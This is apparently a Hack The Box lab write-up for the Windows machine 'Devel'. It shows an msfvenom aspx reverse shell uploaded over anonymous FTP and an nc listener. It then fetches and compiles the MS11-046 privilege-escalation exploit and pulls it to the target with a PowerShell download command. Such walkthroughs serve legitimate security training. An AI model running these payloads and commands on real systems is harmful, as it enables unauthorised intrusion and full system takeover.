---
title: "Devel"
date: 2023-07-03T17:35:59+02:00
tags: ["ftp","windows","web","privesc"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: /HTB/Devel.png
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "This room is a windows room with a http service which runs iis7 web server which content is able at a misconfigured ftp service."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Devel
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Devel

![Untitled](/HTB/devel-icon.png)

## Tools Used

- Nmap
- FTP
- Msfvenom
- Searchsploit

## Port Scanning

```bash
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The scan results shows two open ports, the port 80 has an iis7 web server and the port 21 a ftp service with the content of the website, one folder named aspnet_client gives us a clue of what framework is using the website.

## Enumeration

We can try a reverse shell since it allows us to log in the ftp server anonymously.

First we are going to list the formats we can use with:

```bash
msfvenom --list formats
```

A format specially caught my attention and it’s the aspx format which is used by the [asp.net](http://asp.net) 

We can build the reverse shell with:

```bash
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.20 LPORT=4444 -o reverse-shell.aspx
```

## Exploiting

Let’s exploit the machine

First we are going to connect with the ftp client anonymously with:

```bash
ftp 10.10.10.5 21
```

Once there, let’s send the reverse shell with mput command:

```bash
mput ~/Documents/exploits/reverse-shell.aspx
```

Only left a listener

```bash
nc -lv 4444
```

Now let’s run the file in the browser http://10.10.10.5/reverse-shell.aspx.

## Gaining an Initial Foothold

We are in now. Let’s see if we are root users or not.

![Untitled](/HTB/devel-1.png)

![Untitled](/HTB/devel-2.png)

If we try to enter in the users folder seems that we don’t have permissions.

![Untitled](/HTB/devel-3.png)

## Escalating Privilege

We can list the system information to see if we can escalate privileges.

![Untitled](/HTB/devel-4.png)

Our version is the Windows 7 build 7600 x86, it’s fairly old and no hotfix(s) are applied.

In searchsploit seems doesnt have any result.

![Untitled](/HTB/devel-5.png)

If we google it we can see a [exploit](https://www.exploit-db.com/exploits/40564) that fits well with what we want to do.

![Untitled](/HTB/devel-6.png)

![Untitled](/HTB/devel-7.png)

The exploit CVE-**[2011-1249](https://nvd.nist.gov/vuln/detail/CVE-2011-1249)** help us to escalate privileges.

Let’s download the exploit with searchsploit 

```bash
searchsploit -m "40564"
```

If we take a look to the documentation of the exploit we can see that the exploit need to be compiled with `mingw32` first.

```bash
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
```

Now let’s create a http server with python to send this .exe.

```bash
python -m http.server 80
```

The remote machine doesn’t seems to have netcat but has powershell we can download the file with:

```bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.20:80/MS11-046.exe', 'c:\Users\Public\Downloads\40564.exe')"
```

Once we have the exploit only left to run it, we can find it in c:\Users\Public\Downloads

![Untitled](/HTB/devel-9.png)

![Untitled](/HTB/devel-10.png)

We have gained root access.

## Flag(s)

Let’s navigate to the user and root Desktops where we can find the flags.

**User Flag**

![Untitled](/HTB/devel-11.png)

**Root Flag**

![Untitled](/HTB/devel-12.png)

## Lessons Learned

- What insights did you gain from the room?
    
    We learned to put a reverse shell via the ftp service as well as escalate privilege with a exploit that take advantage of the afd.sys file.
    
- Were there any novel tools or techniques employed?
    
    We don’t employed any new tools but he know now a new format of reverse shell (aspx) that is employed by Microsoft [asp.net](http://asp.net).

**Thank you for reading, and happy hacking! 😄**
